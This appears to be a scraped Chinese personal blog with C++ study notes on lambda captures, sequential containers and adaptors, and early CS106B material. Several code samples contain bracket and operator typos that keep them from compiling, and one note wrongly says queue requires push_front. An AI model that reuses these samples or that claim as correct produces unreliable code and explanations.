<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fcn1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">size_t</span> v1 = <span class="number">42</span>; <span class="comment">//局部变量</span></span><br><span class="line">	<span class="comment">// f包含对v1的引用</span></span><br><span class="line">	<span class="keyword">auto</span> f = [&amp;v1]{ <span class="keyword">return</span> v1; };</span><br><span class="line">	v1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">auto</span> j = <span class="built_in">f</span>(); <span class="comment">// j 为 0，f保存了v1的引用</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="隐式捕获">隐式捕获</h3>
<ul>
<li>让编译器根据lambda体中的代码来推断我们要使用哪些变量</li>
<li><code>&amp;</code>告诉编译器采用捕获引用方式，<code>=</code>则表示采用值捕获方式</li>
<li>混合使用隐式捕获和显式捕获时，显式捕获的变量必须使用与隐式捕获不同的方式。</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sz为隐式捕获，值捕获方式，这里的lambda表达式是find_if的第三个参数</span></span><br><span class="line">wc = <span class="built_in">find_if</span>(words.<span class="built_in">begin</span>(),words.<span class="built_in">end</span>(), </span><br><span class="line">             [=](<span class="type">const</span> string &amp;s)</span><br><span class="line">                { <span class="keyword">return</span> s.<span class="built_in">size</span>() &gt;= sz; });</span><br></pre></td></tr></tbody></table></figure>
<h2 id="可变lambda">可变lambda</h2>
<ul>
<li><p>对于一个值被拷贝的变量，若要改变一个被捕获的变量的值，就必须在参数列表首加上关键字mutable</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fen3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="type">size_t</span> v1 = <span class="number">42</span>;<span class="comment">//局部变量</span></span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="comment">// f可以改变它所捕获的变量的值</span></span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">auto</span> f = [v1] ()  <span class="keyword">mutable</span> { <span class="keyword">return</span> ++v1;};</span></span></span><br><span class="line"><span class="params"><span class="function">	v1 =<span class="number">0</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">auto</span> j = f();<span class="comment">//j为43</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>对于引用捕获的变量可以直接修改，不用添加mutable关键字</p></li>
</ul>
<h2 id="指定返回类型">指定返回类型</h2>
<ul>
<li><p>默认情况下，如果一个lambda体包含<code>return</code>之外的任何语句，则编译器假定此lambda返回void。例如下面的代码就是错误的</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//错误：不能推断lambda的返回类型</span></span><br><span class="line"><span class="built_in">transform</span>(vi.<span class="built_in">begin</span>(), vi.<span class="built_in">end</span>(), vi.<span class="built_in">begin</span>(),</span><br><span class="line">          [](<span class="type">int</span> i)</span><br><span class="line">            { <span class="keyword">if</span>(i&lt;<span class="number">0</span>) <span class="keyword">return</span> -i; <span class="keyword">else</span> <span class="keyword">return</span> i;};</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>若lambda表达式包含其他语句，且返回值其实不是void，则使用尾置返回类型</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">transform</span>(vi.<span class="built_in">begin</span>(), vi.<span class="built_in">end</span>(), vi.<span class="built_in">begin</span>(),</span><br><span class="line">          [](<span class="type">int</span> i) -&gt; <span class="type">int</span>  <span class="comment">// 这里指定了返回类型</span></span><br><span class="line">            { <span class="keyword">if</span>(i&lt;<span class="number">0</span>) <span class="keyword">return</span> -i; <span class="keyword">else</span> <span class="keyword">return</span> i; });</span><br></pre></td></tr></tbody></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/20/%E9%A1%BA%E5%BA%8F%E5%AE%B9%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/20/%E9%A1%BA%E5%BA%8F%E5%AE%B9%E5%99%A8/" class="post-title-link" itemprop="url">顺序容器</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-11-20 00:00:00" itemprop="dateCreated datePublished" datetime="2024-11-20T00:00:00+08:00">2024-11-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-01-01 11:17:58" itemprop="dateModified" datetime="2025-01-01T11:17:58+08:00">2025-01-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CPP/" itemprop="url" rel="index"><span itemprop="name">CPP</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>内容参考《C++ primer》</p>
<p>遇到具体的容器操作可以查看https://zh.cppreference.com/w/cpp</p>
<h2 id="顺序容器类型">顺序容器类型</h2>
<p><code>vector</code>、<code>deque</code>、<code>list</code>、<code>forward_list</code>、<code>array</code>、<code>string</code></p>
<ul>
<li><code>string</code>和<code>vector</code>将元素保存在连续的内存空间中。在这两种容器的中间位置添加或删除元素就会非常耗时——需要移动插入/删除位置之后的所有元素</li>
<li><code>list</code>和<code>forward_list</code>两个容器的设计目的是令容器任何位置的添加和删除操作都很快速。但是这两个容器不支持元素的随机访问。</li>
<li><code>deque</code>（双端队列）支持随机访问，在其两端添加或删除元素都是很快的</li>
<li><code>array</code>对象的大小是固定的。因此，<code>array</code>不支持添加和删除元素以及改变容器大小的操作</li>
<li>顺序容器是可以嵌套的，例如：<code>vector&lt;vector&lt;string&gt;&gt; lines;</code></li>
</ul>
<h2 id="定义和初始化">定义和初始化</h2>
<h3 id="拷贝初始化">拷贝初始化</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; ivec; <span class="comment">//初始状态为空</span></span><br><span class="line"><span class="comment">//在此处给ivec添加一些值</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ivec2</span><span class="params">(ivec)</span></span>; <span class="comment">//把ivec的元素拷贝给ivec2</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; ivec3 = ivec; <span class="comment">//把ivec的元素拷贝给ivec3</span></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">it</span><span class="params">(b, e)</span></span>; <span class="comment">//it初始化为迭代器b和e指定范围中的元素的拷贝。</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="列表初始化">列表初始化</h3>
<p>使用花括号初始化元素值</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;string&gt; <span class="title">vl</span><span class="params">(<span class="string">"a"</span>,<span class="string">"an"</span>,<span class="string">"the"</span>};<span class="comment">//列表初始化</span></span></span></span><br><span class="line"><span class="params"><span class="function">vector&lt;string&gt; v1 = {<span class="string">"a"</span>, <span class="string">"an"</span>, <span class="string">"the"</span>}; </span></span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="创建指定数量的元素">创建指定数量的元素</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ivec</span><span class="params">(<span class="number">10</span>,<span class="number">-1</span>)</span></span>; <span class="comment">//10个int类型的元素，每个都被初始化为-1</span></span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">svec</span><span class="params">(<span class="number">10</span>,<span class="string">"hi!"</span>)</span></span>;<span class="comment">// 10个string类型的元素，每个都被初始化为"hi!"</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="值初始化">值初始化</h3>
<p>只提供容器容纳的元素数量</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ivec</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 10个元素，每个都初始化为0</span></span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">svec</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 10个元素，每个都是空string对象</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="array">array</h3>
<ul>
<li><p>使用该类型时，<strong>必须</strong>指明元素类型和<strong>大小</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array&lt;<span class="type">int</span>, 10&gt; a1;</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>数组类型不能进行拷贝或对象赋值操作，但是<code>array</code>类型可以</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> digs[<span class="number">10</span>]=(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>};</span><br><span class="line"><span class="type">int</span> cpy[<span class="number">10</span>] = digs;<span class="comment">//错误：内置数组不支持拷贝或赋值</span></span><br><span class="line">              </span><br><span class="line">array&lt;<span class="type">int</span>,<span class="number">10</span>&gt; digits-(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>};</span><br><span class="line">array&lt;<span class="type">int</span>,<span class="number">10</span>&gt; copy = digits;<span class="comment">//正确：只要数组类型和大小匹配即合法</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<blockquote>
<p>注意区别</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v1</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// v1有10个元素，每个的值都是0</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v2{<span class="number">10</span>}; <span class="comment">// v2有1个元素，该元素的值是10</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">10</span>,<span class="number">1</span>)</span></span>; <span class="comment">// v3有10个元素，每个的值都是1</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v4{<span class="number">10</span>,<span class="number">1</span>); <span class="comment">// v4有2个元素，值分别是10和1</span></span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">v5</span><span class="params">(<span class="string">"hi"</span>};<span class="comment">//列表初始化：v5有一个元素</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">// vector&lt;string&gt; v6("hi"); 错误：不能使用字符串字面值构建vector对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">vector&lt;string&gt; v7(<span class="number">10</span>}; <span class="comment">// v7有10个默认初始化的元素</span></span></span></span><br><span class="line"><span class="params"><span class="function">vector&lt;string&gt; v8(<span class="number">10</span>,<span class="string">"hi"</span>}; <span class="comment">// v8有10个值为"hi"的元素</span></span></span></span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<h2 id="赋值">赋值</h2>
<h3 id="直接赋值">直接赋值</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1 = v2;</span><br><span class="line">v = {a, b, c ...}; <span class="comment">// 初始化列表赋值，不适用于array</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="swap">swap</h3>
<ul>
<li>两个容器的大小不同也可以使用</li>
<li>例如，假定iter在swap之前指向svec1[3]的元素，那么在swap之后它指向svec2[3]的元素。与其他容器不同，对一个string调用swap会导致迭代器、引用和指针失效。</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">swap</span>(v1, v2); </span><br><span class="line">v1.<span class="built_in">swap</span>(v2);<span class="comment">// 交换v1和v2的值，速度比直接赋值快</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="assign">assign</h3>
<p><code>assign</code>操作不适用于关联容器和<code>array</code></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seq.<span class="built_in">assign</span>(b, e); <span class="comment">// 将seq中的元素替换为迭代器b和e所表示的范围中的元素。迭代器b和e不能指向seq中的元素</span></span><br><span class="line">seq.<span class="built_in">assign</span>(il); <span class="comment">// 将seq中的元素替换为初始化列表il中的元素</span></span><br><span class="line">seq.<span class="built_in">assign</span>(n, t); <span class="comment">// 将seq中的元素替换为n个值为t的元素</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="关系运算">关系运算</h2>
<p><code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&gt;=</code>、<code>&lt;=</code></p>
<ul>
<li>如果两个容器具有相同大小且所有元素都两两对应相等，则这两个容器相等；否则两个容器不等。</li>
<li>如果两个容器大小不同，但较小容器中每个元素都等于较大容器中的对应元素，则较小容器小于较大容器。</li>
<li>如果两个容器都不是另一个容器的前缀子序列，则它们的比较结果取决于第一个不相等的元素的比较结果。</li>
</ul>
<h2 id="迭代器">迭代器</h2>
<p>迭代器范围由一对迭代器组成，分别是<code>begin</code>和<code>end</code>，<code>begin</code>指向第一个元素，<code>end</code>指向最后一个元素之后的位置，所以元素所在的区间范围是左闭右开的<code>[begin, end)</code></p>
<h3 id="迭代器运算">迭代器运算</h3>
<ul>
<li><code>*iter</code> ：返回迭代器所指元素的引用</li>
<li><code>++iter</code>：令迭代器指向下一个元素</li>
<li><code>--iter</code>：令迭代器指向上一个元素</li>
<li><code>iter1 == iter2</code>或<code>iter1 != iter2</code>：判断两个迭代器是否相等</li>
</ul>
<h3 id="迭代器类型">迭代器类型</h3>
<p>分为<code>iterator</code>和<code>const_iterator</code>来表示。</p>
<ul>
<li><code>const_iterator</code>和常量指针差不多，能读取但<strong>不能修改</strong>它所指的元素值。</li>
<li><code>iterator</code>的对象可读可写。</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator it;    <span class="comment">// it能读写vector&lt;int&gt;的元素</span></span><br><span class="line">string::iterator it2; <span class="comment">// it2能读写string对象中的字符</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::const_iterator it3;<span class="comment">// it3只能读元素，不能写元素</span></span><br><span class="line">string::const_iterator it4; <span class="comment">// it4只能读字符，不能写字符</span></span><br></pre></td></tr></tbody></table></figure>
<p>一般使用<code>auto</code>声明迭代器，例如<code>auto it = a.begin()</code></p>
<h2 id="下标访问元素">下标访问元素</h2>
<p>我们希望确保下标是合法的，可以使用<code>at</code>成员函数。如果下标越界，<code>at</code>会抛出一个<code>out_of_range</code>异常</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;string&gt; svec;<span class="comment">//空vector</span></span><br><span class="line">cout &lt;&lt; svec[<span class="number">0</span>];<span class="comment">//运行时错误：svec中没有元素!</span></span><br><span class="line">cout &lt;&lt; svec.<span class="built_in">at</span>(<span class="number">0</span>);<span class="comment">//抛出一个out_of_range异常</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="改变容器大小">改变容器大小</h2>
<ul>
<li>使用<code>resize(new_size)</code>修改容器大小</li>
<li>注意<code>array</code>不支持修改容器大小</li>
<li>若要增大容器，则会在容器末尾添加</li>
<li>若要缩小容器，则会删去末尾元素</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">list&lt;<span class="type">int</span>&gt; <span class="title">ilist</span><span class="params">(<span class="number">10</span>,<span class="number">42</span>)</span></span>;<span class="comment">// 10个int:每个的值都是42</span></span><br><span class="line">ilist.<span class="built_in">resize</span>(<span class="number">15</span>);<span class="comment">//将5个值为0的元素添加到ilist的末尾</span></span><br><span class="line">ilist.<span class="built_in">resize</span>(<span class="number">25</span>,<span class="number">-1</span>);<span class="comment">//将10个值为-1的元素添加到ilist的末尾</span></span><br><span class="line">ilist.<span class="built_in">resize</span>(<span class="number">5</span>);<span class="comment">//从ilist末尾删除20个元素</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="适配器">适配器</h2>
<p>这里介绍顺序容器适配器：<code>stack</code>、<code>queue</code>和<code>priority_queue</code>。适配器(adaptor)是标准库中的一个通用概念。容器、迭代器和函数都有适配器。本质上，一个适配器是一种机制。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;string, vector&lt;string&gt;&gt; str_stk; </span><br><span class="line"><span class="comment">//此声明的作用是创建一个以 vector&lt;string&gt; 为底层存储容器的堆栈，堆栈中的每个元素都是一个 string</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>注意要<strong>根据不同适配器的特性重载其默认容器类型</strong>，例如，<code>stack</code>只要求<code>push_back</code>、<code>pop_back</code>和<code>back</code>操作，因此可以使用除<code>array</code>和<code>forward_list</code>之外的任何容器类型来构造<code>stack</code>。<code>queue</code>适配器要求<code>back</code>、<code>push_back</code>、<code>front</code>和<code>push_front</code>，因此它可以构造于<code>list</code>或<code>deque</code>之上，但不能基于<code>vector</code>构造。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/26/CS106B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/26/CS106B/" class="post-title-link" itemprop="url">CS106B-22Winter</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-26 19:29:42" itemprop="dateCreated datePublished" datetime="2024-10-26T19:29:42+08:00">2024-10-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-03-02 00:49:43" itemprop="dateModified" datetime="2025-03-02T00:49:43+08:00">2025-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CPP/" itemprop="url" rel="index"><span itemprop="name">CPP</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CS106B/" itemprop="url" rel="index"><span itemprop="name">CS106B</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>26 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>参考资料：</p>
<p>https://www.zhihu.com/column/c_1471256108476461057
（实验环境配置/实验代码）</p>
<p>https://web.stanford.edu/class/archive/cs/cs106b/cs106b.1224/schedule.html#
（教学安排）</p>
<p><a target="_blank" rel="noopener" href="https://web.stanford.edu/dept/cs_edu/resources/cslib_docs/">Stanford
C++ Library Documentation</a></p>
<p>https://web.stanford.edu/class/cs106x/res/reader/CS106BX-Reader.pdf
（教材）</p>
<h2 id="chapter-1">Chapter 1</h2>
<h3 id="library-inclusions">library inclusions</h3>
<p>通过<code>#include</code>从对应头文件中读取相关定义，<code>&lt;iostream&gt;</code>中的尖括号表示这是一个系统库，也可以使用自己编写的头文件，则不包含尖括号而是以<code>.h</code>结尾。</p>
<h3 id="namespaces">namespaces</h3>
<p>不同的库或模块可能会定义相同的名称，举个例子，如果一个第三方库定义了一个函数叫“cout”，而你在代码中也使用了标准库的<code>std::cout</code>，为了避免这种情况，C++的命名空间设计允许你将不同的代码片段放在各自的命名空间中，这样就算名称相同，也不会冲突，例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mylib {</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">cout</span><span class="params">()</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"This is mylib's cout!"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"This is standard cout!"</span> &lt;&lt; std::endl;  <span class="comment">// std 命名空间中的 cout</span></span><br><span class="line">    mylib::<span class="built_in">cout</span>();  <span class="comment">// mylib 命名空间中的 cout</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>可以使用<code>using namespace std;</code>将该命令空间中的所有成员加入当前域，因此就不用添加namespace前缀了，但是这个功能在大项目中要慎用。</p>
<h3 id="constants">Constants</h3>
<p>常量的值一般不改变，例如 Π 的值，因此可以定义：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14159265358979323846</span>;  <span class="comment">// 常量一般大写</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="基本数据类型">基本数据类型</h3>
<ol type="1">
<li><p>整型</p>
<blockquote>
<p><strong>0</strong>42——八进制，<strong>0x</strong>51——十六进制</p>
<p>整型结尾有<code>U</code>表示无符号数</p>
</blockquote>
<ul>
<li>short</li>
<li>int</li>
<li>long：在数字结尾加上<code>L</code>则表示<code>long</code>类型</li>
</ul></li>
<li><p>浮点型</p>
<blockquote>
<p>用标准计数法表示光速：2.9979E+8</p>
</blockquote>
<ul>
<li>float</li>
<li>double</li>
<li>long double</li>
</ul></li>
<li><p>字符型</p>
<ul>
<li><p>char：单引号内只能是字符而不是字符串</p></li>
<li><p>string：使用双引号。需要通过<code>#include &lt;string&gt;</code>调用</p>
<blockquote>
<p>字符串类型是标准库命名空间的一部分，即命名空间也是
<strong>std</strong></p>
</blockquote></li>
</ul></li>
<li><p>布尔型</p>
<ul>
<li>bool</li>
</ul></li>
<li><p>枚举型</p>
<ul>
<li><p>enum：语法为<code>enum typename { namelist };</code>（所有类型名称都以大写字母开头，枚举常量的名称完全以大写字母书写），示例如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> { NORTH, EAST, SOUTH, WEST };</span><br><span class="line"><span class="comment">//从0开始编号来为常量名称赋值。NORTH被赋予值0，EAST被赋予值1，SOUTH被赋予数值2，WEST被赋予数值3</span></span><br><span class="line"><span class="comment">//也支持用户自定义值的大小，例如：</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Coin</span> { </span><br><span class="line">   PENNY = <span class="number">1</span>, </span><br><span class="line">   NICKEL = <span class="number">5</span>, </span><br><span class="line">   DIME = <span class="number">10</span>, </span><br><span class="line">   QUARTER = <span class="number">25</span>, </span><br><span class="line">   HALF_DOLLAR = <span class="number">50</span>, </span><br><span class="line">   DOLLAR = <span class="number">100</span> </span><br><span class="line">};</span><br><span class="line"><span class="comment">//若只为第一个常量赋值，则后续的常量是接着第一个常量连续编号的</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul></li>
</ol>
<h3 id="运算符">运算符</h3>
<ul>
<li><p>单目运算符：一个操作数</p></li>
<li><p>双目运算符：两个操作数</p></li>
<li><p>三目运算符：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(condition) ? exp1 : exp2  <span class="comment">//若condition为true，则返回exp1，否则返回exp2</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h3 id="类型转换type-cast">类型转换（Type Cast）</h3>
<p>语法如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quotient = <span class="built_in">double</span>(num) / den; <span class="comment">//在对应变量 num 前添加转换后的类型</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="赋值">赋值</h3>
<p>下面这个式子的作用是<code>x=6, y=7, z=13</code></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z = (x = <span class="number">6</span>) + (y = <span class="number">7</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>赋值表达式的返回值就是待赋的值</p>
<h3 id="控制语句">控制语句</h3>
<ul>
<li>if</li>
<li>switch</li>
<li>while：条件测试在循环的每个循环之前进行，包括第一个循环</li>
<li>for</li>
</ul>
